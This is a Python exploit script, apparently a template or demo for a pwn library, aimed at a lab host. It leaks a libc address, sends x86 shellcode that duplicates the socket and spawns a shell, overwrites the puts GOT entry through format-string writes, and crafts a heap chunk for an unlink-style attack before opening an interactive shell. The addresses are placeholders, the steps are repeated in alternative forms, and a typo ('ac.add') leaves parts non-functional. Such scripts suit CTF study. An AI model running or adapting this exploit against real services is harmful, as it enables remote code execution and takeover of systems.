#!/usr/bin/env python
from sc_pwn import *

rhp     = ("192.168.75.129",8080)

offset_libc_main    = 0xdeadbeef
offset_libc_system  = 0xcafebabe
addr_got_puts       = 0xfacefeed
addr_heap           = 0xb105f00d
addr_str_sh         = 0xdeadbeef

#==========
def attack(nc):
    nc.read_until('\n')
    addr = nc.read(4)
    nc.read_all()

    addr_libc_main      = unpack_32(addr)
    addr_base_libc      = addr_libc_main - offset_libc_main
    addr_libc_system    = addr_base_libc + offset_libc_system
    
    info("information   = 0x%08x"%0xdeadbeef)
    proc("processed     = 0x%08x"%0xcafebabe)
    warn("waring        = 0x%08x"%0)

    sc = ShellCode('x86',260)
    sc.dup2(4,0)
    sc.dup2(4,1)
    ac.add('\x90')
    sc.sh()
    sc.padding()
    nc.send(sc.get())

    sc = ShellCode('x86',max_len=260)
    shellcode  = sc.dup2(4,0)
    shellcode += sc.dup2(4,1)
    shellcode += sc.execve(addr_str_sh)
    shellcode += sc.padding(None,'\x90')
    nc.send(shellcode)

    fsb = FSB(len(shellcode),2)
    exploit_st1  = shellcode
    exploit_st1 += fsb.addr(addr_got_puts)
    exploit_st1 += fsb.addr(addr_got_puts+0x02)
    exploit_st1 += fsb.write(6,addr_libc_system&0xffff)
    exploit_st1 += fsb.write(7,addr_libc_system>>0x10)
    nc.sendln(exploit_st1)

    fsb = FSB(offset=len(shellcode),size=2)
    fsb.set_adrval(addr_got_puts, addr_libc_system)
    fsb.set_adrval(addr_heap, 0xdeadbeef)
    exploit_st2  = shellcode
    exploit_st2 += fsb.auto_write(index=6)
    nc.sendln(exploit_st2)

    fsb = FSB()
    fsb.auto_write(6,{addr_got_puts:addr_libc_system,addr_heap:0xdeadbeef})
    nc.sendln(fsb.get())

    exploit_st3  = pack_32(heap_sb(0xc,PREV_INUSE|IS_MMAPED|IS_NON_MAINARENA))  # p->size
    exploit_st3 += pack_32(addr_got_puts-0x8)                                   # p->fd
    exploit_st3 += pack_32(addr_heap)                                           # p->bk
    nc.sendln(exploit_st3)

    nc.read_all()

#==========

if __name__=='__main__':
    nc = Communicate(rhp)
    attack(nc)

    sh = Shell(nc)
    sh.select()

    del(sh)
    del(nc)
    
#==========
